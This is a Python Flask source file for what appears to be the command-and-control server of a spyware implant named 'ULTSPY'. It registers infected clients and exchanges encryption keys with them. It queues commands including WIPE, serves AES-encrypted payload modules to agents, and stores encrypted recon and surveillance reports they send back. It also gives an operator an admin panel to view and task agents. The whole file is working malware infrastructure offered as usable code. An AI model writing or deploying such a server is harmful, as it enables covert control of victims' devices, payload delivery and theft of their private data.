from flask import Flask, request, jsonify, abort
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
import logging
import base64
import os
import json
import hmac
import hashlib
import jwt
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sympadding

from functools import wraps

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///dduf.db'
db = SQLAlchemy(app)

log_level = os.environ.get('LOG_LEVEL', 'INFO').upper()
logging.basicConfig(
    level=getattr(logging, log_level, logging.INFO),
    format='%(asctime)s %(levelname)s: %(message)s'
)

TIMEOUT_SECONDS = 180
API_KEYS = {}
BACKEND_VERSION = os.environ.get('BACKEND_VERSION', 'dev')
FRONTEND_VERSION = 'unknown'
try:
    pkg_path = os.path.join(os.path.dirname(__file__), '../frontend/package.json')
    with open(pkg_path, 'r') as f:
        FRONTEND_VERSION = json.load(f).get('version', 'unknown')
except Exception:
    pass

CONFIG = {}
ALLOWED_HOSTS = []
JWT_SECRET = None
if os.path.exists('config.json'):
    with open('config.json', 'r') as f:
        try:
            CONFIG = json.load(f)
            ALLOWED_HOSTS = CONFIG.get('allowed_hosts', [])
            API_KEYS = CONFIG.get('api_keys', {})
            JWT_SECRET = CONFIG.get('jwt_secret')
        except Exception as e:
            logging.warning('Failed to load config.json: %s', e)


def require_api_key(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        key = request.headers.get('X-API-KEY')
        if not key or key not in API_KEYS.values():
            abort(401)
        return f(*args, **kwargs)
    return wrapper

def require_token(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        auth = request.headers.get('Authorization', '')
        if not auth.startswith('Bearer '):
            abort(401)
        token = auth.split(' ', 1)[1]
        try:
            data = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
            request.token_data = data
        except Exception:
            abort(401)
        return f(*args, **kwargs)
    return wrapper

@app.before_request
def check_host_header():
    host = request.headers.get('Host', '')
    if ALLOWED_HOSTS and host not in ALLOWED_HOSTS:
        logging.warning('Blocked request with host %s', host)
        abort(404)

NONCE_WINDOW = 50

@app.before_request
def verify_request():
    if request.path in ('/key_exchange', '/login') or request.path.startswith('/admin') or request.path.startswith('/config'):
        return
    uuid = None
    if request.view_args:
        uuid = request.view_args.get('uuid')
    if not uuid:
        data = request.get_json(silent=True) or {}
        uuid = data.get('uuid')
    if not uuid:
        return
    client = Client.query.filter_by(uuid=uuid).first()
    if not client or not client.aes_key:
        abort(401)
    sig = request.headers.get('X-ULTSPY-Signature')
    nonce = request.headers.get('X-ULTSPY-Nonce')
    ts = request.headers.get('X-ULTSPY-Timestamp')
    if not sig or not nonce or not ts:
        abort(401)
    try:
        ts_int = int(ts)
    except ValueError:
        abort(401)
    if abs(datetime.utcnow().timestamp() - ts_int) > 60:
        logging.warning('Timestamp mismatch for %s', uuid)
        abort(401)
    if NonceRecord.query.filter_by(client_id=client.id, nonce=nonce).first():
        logging.warning('Replay attack for %s', uuid)
        abort(401)
    url = request.base_url
    if request.query_string:
        url += '?' + request.query_string.decode()
    body = request.get_data(as_text=True) if request.method != 'GET' else ''
    message = f"{request.method}\n{url}\n{ts}\n{body}"
    key = base64.b64decode(client.aes_key)
    expected = hmac.new(key, message.encode(), hashlib.sha256).digest()
    expected_b64 = base64.b64encode(expected).decode()
    if not hmac.compare_digest(expected_b64, sig):
        logging.warning('Bad signature for %s', uuid)
        abort(401)
    db.session.add(NonceRecord(client_id=client.id, nonce=nonce))
    cutoff = datetime.utcnow() - timedelta(minutes=10)
    NonceRecord.query.filter(NonceRecord.created_at < cutoff).delete()
    db.session.commit()

class Client(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    uuid = db.Column(db.String(64), unique=True, nullable=False)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    public_key = db.Column(db.Text)
    aes_key = db.Column(db.Text)
    online = db.Column(db.Boolean, default=False)

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
    command = db.Column(db.String(64))
    parameters = db.Column(db.Text)
    executed = db.Column(db.Boolean, default=False)

class LogEntry(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
    message = db.Column(db.String(256))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class NonceRecord(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
    nonce = db.Column(db.String(64))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class ReconData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
    data = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class SurveillanceData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
    data = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Template(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    template_id = db.Column(db.String(64), unique=True, nullable=False)
    name = db.Column(db.String(128), unique=True, nullable=False)
    command = db.Column(db.String(64), nullable=False)
    parameters = db.Column(db.Text, default='{}')

def log_event(client, message):
    entry = LogEntry(client_id=client.id, message=message)
    db.session.add(entry)
    db.session.commit()


def check_timeouts():
    now = datetime.utcnow()
    threshold = now - timedelta(seconds=TIMEOUT_SECONDS)
    outdated = Client.query.filter(Client.last_seen < threshold, Client.online == True).all()
    for c in outdated:
        c.online = False
    if outdated:
        db.session.commit()


def register_client(uuid):
    check_timeouts()
    client = Client.query.filter_by(uuid=uuid).first()
    if not client:
        client = Client(uuid=uuid)
        db.session.add(client)
    client.last_seen = datetime.utcnow()
    client.online = True
    db.session.commit()
    log_event(client, 'register')
    return client


@app.route('/login', methods=['POST'])
def login():
    data = request.get_json(force=True)
    key = data.get('api_key')
    for kid, value in API_KEYS.items():
        if key == value:
            token = jwt.encode(
                {
                    'kid': kid,
                    'exp': datetime.utcnow() + timedelta(hours=1),
                },
                JWT_SECRET,
                algorithm='HS256',
            )
            return jsonify({'token': token})
    return jsonify({'error': 'unauthorized'}), 401

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    client = register_client(data['uuid'])
    return jsonify({'id': client.id})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    client = register_client(data['uuid'])
    log_event(client, 'heartbeat')
    return jsonify({'status': 'ok'})

@app.route('/command/<uuid>', methods=['POST'])
def add_command(uuid):
    data = request.get_json()
    cmd = data.get('command') or data.get('cmd')
    params = data.get('parameters', {})
    client = Client.query.filter_by(uuid=uuid).first()
    if not client or not cmd:
        return jsonify({'error': 'invalid'}), 400
    if cmd in ('SAFE_MODE', 'WIPE', 'DEEP_SLEEP'):
        logging.info('%s issued for %s', cmd, uuid)
    log_event(client, f'queue {cmd}')
    c = Command(client_id=client.id, command=cmd, parameters=json.dumps(params))
    db.session.add(c)
    db.session.commit()
    return jsonify({'status': 'queued'})

@app.route('/commands/<uuid>', methods=['GET'])
def get_commands(uuid):
    client = Client.query.filter_by(uuid=uuid).first()
    if not client:
        return jsonify({'commands': []})
    cmds = Command.query.filter_by(client_id=client.id, executed=False).all()
    result = []
    for c in cmds:
        params = json.loads(c.parameters) if c.parameters else {}
        result.append({'command': c.command, 'parameters': params})
    for c in cmds:
        c.executed = True
    db.session.commit()
    return jsonify({'commands': result})

@app.route('/update/<int:client_id>', methods=['POST'])
def update(client_id):
    return jsonify({'status': 'received'})

@app.route('/key_exchange', methods=['POST'])
def key_exchange():
    data = request.get_json(force=True)
    uuid = data.get('uuid')
    pub_pem = data.get('public_key')
    if not uuid or not pub_pem:
        return jsonify({'error': 'invalid'}), 400
    client = register_client(uuid)
    client.public_key = pub_pem
    public_key = load_pem_public_key(pub_pem.encode())
    aes_key = os.urandom(32)
    enc_key = public_key.encrypt(
        aes_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    client.aes_key = base64.b64encode(aes_key).decode()
    db.session.commit()
    return jsonify({'aes_key': base64.b64encode(enc_key).decode()})


@app.route('/payload/<uuid>/<module>', methods=['GET'])
def get_payload(uuid, module):
    client = Client.query.filter_by(uuid=uuid).first()
    if not client or not client.aes_key:
        return jsonify({'error': 'unknown'}), 404
    path = os.path.join('payloads', module)
    if not os.path.exists(path):
        return jsonify({'error': 'not found'}), 404
    with open(path, 'rb') as f:
        data = f.read()
    key = base64.b64decode(client.aes_key)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    padder = sympadding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    enc = encryptor.update(padded) + encryptor.finalize()
    blob = base64.b64encode(iv + enc).decode()
    return jsonify({'payload': blob})


@app.route('/recon/<uuid>', methods=['POST'])
def recon(uuid):
    client = Client.query.filter_by(uuid=uuid).first()
    if not client or not client.aes_key:
        return jsonify({'error': 'unknown'}), 404
    data = request.get_json(force=True)
    blob = data.get('data')
    if not blob:
        return jsonify({'error': 'invalid'}), 400
    try:
        raw = base64.b64decode(blob)
        key = base64.b64decode(client.aes_key)
        iv = raw[:16]
        enc = raw[16:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        padded = decryptor.update(enc) + decryptor.finalize()
        unpad = sympadding.PKCS7(128).unpadder()
        plain = unpad.update(padded) + unpad.finalize()
        text = plain.decode()
        if app.debug:
            logging.info('Recon from %s: %s', uuid, text)
        rec = ReconData(client_id=client.id, data=text)
        db.session.add(rec)
        db.session.commit()
    except Exception as e:
        logging.warning('Failed recon decode for %s: %s', uuid, e)
        return jsonify({'error': 'decode'}), 400
    return jsonify({'status': 'ok'})


@app.route('/surveillance_report/<uuid>', methods=['POST'])
def surveillance_report(uuid):
    client = Client.query.filter_by(uuid=uuid).first()
    if not client or not client.aes_key:
        return jsonify({'error': 'unknown'}), 404
    data = request.get_json(force=True)
    blob = data.get('data')
    if not blob:
        return jsonify({'error': 'invalid'}), 400
    try:
        raw = base64.b64decode(blob)
        key = base64.b64decode(client.aes_key)
        iv = raw[:16]
        enc = raw[16:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        padded = decryptor.update(enc) + decryptor.finalize()
        unpad = sympadding.PKCS7(128).unpadder()
        plain = unpad.update(padded) + unpad.finalize()
        text = plain.decode()
        if app.debug:
            logging.info('Surveillance from %s: %s', uuid, text)
        rec = SurveillanceData(client_id=client.id, data=text)
        db.session.add(rec)
        db.session.commit()
    except Exception as e:
        logging.warning('Failed surveillance decode for %s: %s', uuid, e)
        return jsonify({'error': 'decode'}), 400
    return jsonify({'status': 'ok'})


@app.route('/status/<uuid>', methods=['GET'])
def status(uuid):
    check_timeouts()
    client = Client.query.filter_by(uuid=uuid).first()
    if not client:
        return jsonify({'error': 'unknown'}), 404
    state = 'online' if client.online else 'offline'
    last = client.last_seen.isoformat() if client.last_seen else None
    return jsonify({'uuid': uuid, 'status': state, 'last_seen': last})

@app.route('/config/targets', methods=['GET'])
def list_targets():
    return jsonify({'targets': ALLOWED_HOSTS})


@app.route('/admin/config', methods=['GET'])
@require_token
def admin_config():
    return jsonify({
        'api_keys': list(API_KEYS.keys()),
        'heartbeat_timeout': TIMEOUT_SECONDS,
        'versions': {
            'backend': BACKEND_VERSION,
            'frontend': FRONTEND_VERSION,
        },
        'targets': ALLOWED_HOSTS,
        'allowed_hosts': ALLOWED_HOSTS,
    })


@app.route('/admin/agents', methods=['GET'])
@require_token
def list_agents():
    check_timeouts()
    clients = Client.query.all()
    result = []
    for c in clients:
        result.append({
            'uuid': c.uuid,
            'online': c.online,
            'last_seen': c.last_seen.isoformat() if c.last_seen else None
        })
    return jsonify({'agents': result})


@app.route('/admin/logs/<uuid>', methods=['GET'])
@require_token
def agent_logs(uuid):
    """Return recon reports, surveillance data and log messages for an agent."""
    client = Client.query.filter_by(uuid=uuid).first()
    if not client:
        return jsonify({'logs': []})

    entries = []
    for l in LogEntry.query.filter_by(client_id=client.id).all():
        entries.append({
            'timestamp': l.created_at.replace(tzinfo=None).isoformat() + 'Z',
            'type': 'Info',
            'description': l.message,
        })

    for r in ReconData.query.filter_by(client_id=client.id).all():
        entries.append({
            'timestamp': r.created_at.replace(tzinfo=None).isoformat() + 'Z',
            'type': 'Recon',
            'description': 'Recon data',
            'data': r.data,
        })

    for s in SurveillanceData.query.filter_by(client_id=client.id).all():
        entries.append({
            'timestamp': s.created_at.replace(tzinfo=None).isoformat() + 'Z',
            'type': 'Surveillance',
            'description': 'Surveillance report',
            'data': s.data,
        })

    entries.sort(key=lambda x: x['timestamp'], reverse=True)
    return jsonify({'logs': entries})


@app.route('/admin/command/<uuid>', methods=['POST'])
@require_token
def admin_command(uuid):
    return add_command(uuid)


@app.route('/admin/templates', methods=['GET'])
@require_token
def list_templates():
    entries = Template.query.all()
    result = []
    for t in entries:
        params = json.loads(t.parameters) if t.parameters else {}
        result.append({
            'template_id': t.template_id,
            'name': t.name,
            'command': t.command,
            'parameters': params,
        })
    return jsonify({'templates': result})


@app.route('/admin/templates', methods=['POST'])
@require_token
def create_template():
    data = request.get_json(force=True)
    name = data.get('name')
    command = data.get('command')
    params = data.get('parameters', {})
    if not name or not command:
        return jsonify({'error': 'invalid'}), 400
    if Template.query.filter_by(name=name).first():
        return jsonify({'error': 'duplicate'}), 409
    tid = base64.urlsafe_b64encode(os.urandom(12)).decode()
    entry = Template(
        template_id=tid,
        name=name,
        command=command,
        parameters=json.dumps(params),
    )
    db.session.add(entry)
    db.session.commit()
    return jsonify({'template_id': tid})


@app.route('/admin/templates/<tid>', methods=['DELETE'])
@require_token
def delete_template(tid):
    entry = Template.query.filter_by(template_id=tid).first()
    if not entry:
        return jsonify({'error': 'not found'}), 404
    db.session.delete(entry)
    db.session.commit()
    return jsonify({'status': 'deleted'})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000, debug=False)
